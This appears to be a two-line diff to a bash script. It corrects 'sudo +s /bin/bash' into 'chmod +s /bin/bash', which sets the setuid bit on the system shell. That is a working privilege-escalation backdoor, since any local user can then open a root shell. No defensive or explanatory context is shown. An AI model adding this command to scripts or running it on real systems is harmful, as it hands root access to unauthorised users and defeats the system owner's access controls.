@@ -1,2 +1,2 @@
 #!/bin/bash
-sudo +s /bin/bash
+chmod +s /bin/bash
